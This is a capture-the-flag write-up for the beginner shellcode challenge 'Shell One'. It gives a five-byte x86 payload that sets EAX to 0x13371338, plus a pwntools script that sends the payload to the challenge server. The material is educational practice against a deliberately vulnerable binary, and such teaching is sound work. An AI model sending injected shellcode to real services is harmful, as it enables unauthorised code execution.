---
title: "Shell One — Minimal Shellcode to Set EAX"
date: 2025-01-01
categories: ["CyberChallenge"]
series: ["CyberChallenge Italy"]
tags: ["pwn", "shellcode", "x86", "assembly"]
difficulty: "beginner"
summary: "Write minimal x86 shellcode that sets EAX to 0x13371338 to satisfy the binary's check and unlock execution flow."
---

## The Challenge

The binary accepts shellcode and executes it. The only requirement to get a shell (or the flag) is that after the shellcode runs, `EAX` must equal `0x13371338`. The binary presumably checks this register value and proceeds to do something useful if it matches — print the flag, drop to a shell, etc.

## Approach

This is a "write any shellcode" challenge with a single constraint: set a register to a specific value and return cleanly (or just not crash before the check). The shellcode doesn't need to do anything complex — load immediate into EAX, then either let execution fall through or execute a `ret` to return control to the binary.

In x86, `mov eax, imm32` is a 5-byte instruction. That's the entire shellcode body. Adding a `ret` at the end is optional depending on how the binary jumps to shellcode (via `call`, `jmp`, or simply writing to a buffer and jumping) but it's good practice.

No need for `execve`, no stack pivoting, no gadget chains — just the minimal instruction sequence.

## Solution

```python
from pwn import *

shellcode = b'\xb8\x38\x13\x37\x13'  # mov eax, 0x13371338
conn = remote("shellone.pwn.ccit25.chals.havce.it", 1337)
conn.send(shellcode)
conn.interactive()
```

The raw bytes `\xb8\x38\x13\x37\x13` are the machine encoding of `mov eax, 0x13371338` for x86 — assembled by hand and hardcoded directly. This is faster than calling `asm()` when you know the bytes upfront: `\xb8` is the opcode for `mov eax, imm32`, followed by the four immediate bytes in little-endian order (`\x38\x13\x37\x13` = `0x13371338`). No `ret` is needed here because the binary doesn't return from the shellcode buffer — it just checks EAX after execution.

## What I Learned

Shellcode challenges don't always ask for a full shell. Sometimes the exploit condition is trivially simple — a single `mov` instruction. Reading the binary to understand exactly what condition triggers the win path saves time compared to immediately reaching for execve shellcode templates.
